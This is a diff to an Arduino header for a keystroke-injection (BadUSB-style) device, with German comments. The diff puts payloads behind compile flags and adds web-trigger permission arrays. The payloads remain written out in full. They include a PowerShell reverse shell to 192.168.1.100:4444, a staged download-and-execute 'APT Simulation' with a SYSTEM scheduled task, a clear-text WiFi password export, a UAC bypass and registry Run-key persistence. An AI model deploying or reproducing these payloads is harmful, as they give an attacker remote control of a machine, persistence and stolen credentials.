@@ -3,12 +3,19 @@
 
 #include <Arduino.h>
 
-// Struktur für Payloads
 struct Payload {
     const char* name;
     const char* commands;
     const char* description;
 };
+
+#ifndef ENABLE_DANGEROUS_PAYLOADS
+#define ENABLE_DANGEROUS_PAYLOADS 0
+#endif
+
+#ifndef ENABLE_WEB_SENSITIVE_PAYLOADS
+#define ENABLE_WEB_SENSITIVE_PAYLOADS 0
+#endif
 
 // ==================== WINDOWS PAYLOADS ====================
 
@@ -24,11 +31,6 @@ const Payload windowsPayloads[] = {
         "Öffnet PowerShell"
     },
     {
-        "Win: Reverse Shell",
-        "DELAY 2000\nGUI r\nDELAY 300\nSTRING powershell -w h -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\nENTER",
-        "PowerShell Reverse Shell"
-    },
-    {
         "Win: System Info",
         "DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nENTER\nDELAY 500\nSTRING systeminfo\nENTER\nDELAY 2000\nSTRING ipconfig /all\nENTER",
         "Sammelt Systeminformationen"
@@ -42,6 +44,12 @@ const Payload windowsPayloads[] = {
         "Win: WiFi Passwords",
         "DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles\nENTER\nDELAY 2000\nSTRING netsh wlan export profile key=clear\nENTER",
         "Zeigt gespeicherte WiFi Passwörter"
+    }
+#if ENABLE_DANGEROUS_PAYLOADS
+    ,{
+        "Win: Reverse Shell",
+        "DELAY 2000\nGUI r\nDELAY 300\nSTRING powershell -w h -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\nENTER",
+        "PowerShell Reverse Shell"
     },
     {
         "Win: UAC Bypass",
@@ -53,6 +61,24 @@ const Payload windowsPayloads[] = {
         "DELAY 1000\nGUI r\nDELAY 300\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f\nENTER",
         "Fügt Persistence via Registry hinzu"
     }
+#endif
+};
+
+const bool windowsWebAllowed[] = {
+    true,
+    true,
+    true,
+    true,
+#if ENABLE_WEB_SENSITIVE_PAYLOADS
+    true
+#else
+    false
+#endif
+#if ENABLE_DANGEROUS_PAYLOADS
+    ,false,
+    false,
+    false
+#endif
 };
 
 // ==================== BLUETOOTH PAYLOADS ====================
@@ -70,6 +96,11 @@ const Payload bluetoothPayloads[] = {
     }
 };
 
+const bool bluetoothWebAllowed[] = {
+    false,
+    false
+};
+
 // ==================== WIFI PAYLOADS ====================
 
 const Payload wifiPayloads[] = {
@@ -85,14 +116,27 @@ const Payload wifiPayloads[] = {
     }
 };
 
+const bool wifiWebAllowed[] = {
+    false,
+    false
+};
+
 // ==================== KOMBINIERTE PAYLOADS ====================
 
 const Payload combinedPayloads[] = {
+#if ENABLE_DANGEROUS_PAYLOADS
     {
         "APT Simulation",
         "DELAY 2000\nGUI r\nSTRING powershell -w h -nop -c \"iwr http://192.168.1.100/stage1.ps1 -OutFile $env:TEMP\\s1.ps1; .$env:TEMP\\s1.ps1\"\nENTER\nDELAY 5000\nSTRING schtasks /create /tn SystemHealth /tr 'powershell -w h -file $env:TEMP\\s1.ps1' /sc hourly /mo 1 /ru SYSTEM\nENTER",
         "Multi-Stage APT Simulation"
     }
+#endif
+};
+
+const bool combinedWebAllowed[] = {
+#if ENABLE_DANGEROUS_PAYLOADS
+    false
+#endif
 };
 
 // ==================== GESAMTLISTE ====================
@@ -103,35 +147,37 @@ const int wifiCount = sizeof(wifiPayloads) / sizeof(Payload);
 const int combinedCount = sizeof(combinedPayloads) / sizeof(Payload);
 const int totalPayloads = windowsCount + bluetoothCount + wifiCount + combinedCount;
 
-// Kombiniertes Array aller Payloads
 Payload payloads[totalPayloads];
+bool payloadWebAllowed[totalPayloads];
 
-// Hilfsfunktion zum Initialisieren
 void initPayloads() {
     int index = 0;
-    
-    // Windows Payloads kopieren
+
     for(int i = 0; i < windowsCount; i++) {
-        payloads[index++] = windowsPayloads[i];
+        payloads[index] = windowsPayloads[i];
+        payloadWebAllowed[index] = windowsWebAllowed[i];
+        index++;
     }
-    
-    // Bluetooth Payloads kopieren
+
     for(int i = 0; i < bluetoothCount; i++) {
-        payloads[index++] = bluetoothPayloads[i];
+        payloads[index] = bluetoothPayloads[i];
+        payloadWebAllowed[index] = bluetoothWebAllowed[i];
+        index++;
     }
-    
-    // WiFi Payloads kopieren
+
     for(int i = 0; i < wifiCount; i++) {
-        payloads[index++] = wifiPayloads[i];
+        payloads[index] = wifiPayloads[i];
+        payloadWebAllowed[index] = wifiWebAllowed[i];
+        index++;
     }
-    
-    // Kombinierte Payloads kopieren
+
     for(int i = 0; i < combinedCount; i++) {
-        payloads[index++] = combinedPayloads[i];
+        payloads[index] = combinedPayloads[i];
+        payloadWebAllowed[index] = combinedWebAllowed[i];
+        index++;
     }
 }
 
-// Anzahl der Payloads
 const int payloadCount = totalPayloads;
 
 #endif
